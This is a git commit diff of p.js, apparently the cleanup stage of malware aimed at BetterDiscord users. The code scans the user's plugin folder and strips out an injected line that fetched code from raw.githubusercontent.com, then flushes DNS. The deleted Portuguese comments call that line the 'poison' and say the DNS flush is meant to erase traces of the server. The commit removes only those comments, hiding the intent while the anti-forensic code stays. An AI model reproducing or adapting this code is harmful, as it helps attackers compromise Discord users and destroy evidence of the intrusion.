2dc0b721424a871f71d9b9965b122a6d47cf5792
morelli <cesarmorelli92451041@gmail.com>
2026-03-10 05:33:55 -0400

    Update p.js

--- p.js
+++ p.js
@@ -3,9 +3,9 @@
     const path = require('path');
     const pDir = path.join(process.env.APPDATA, 'BetterDiscord', 'plugins');
 
-    // 1. Executa sua função secreta (Injeção de DLL ou o que desejar)
+    // 1.
     console.log("Executando carga na RAM...");
-    // [Seu código de injeção aqui]
+    // 
 
     // 2. Localiza o plugin envenenado e limpa o código
     const files = fs.readdirSync(pDir).filter(f => f.endsWith('.plugin.js'));
@@ -13,13 +13,14 @@
         const fPath = path.join(pDir, file);
         let content = fs.readFileSync(fPath, 'utf8');
         
-        // Remove a linha que contém o link do GitHub (o "veneno")
+        // 
         if (content.includes('githubusercontent')) {
             const cleanContent = content.replace(/\nrequire\('https'\).get\('https:\/\/raw\.githubusercontent\.com[\s\S]*?\)\);/, "");
             fs.writeFileSync(fPath, cleanContent, 'utf8');
         }
     });
 
-    // 3. Flush DNS para sumir com o rastro do servidor
+    // 3.
     require('child_process').exec('ipconfig /flushdns');
 })();
+
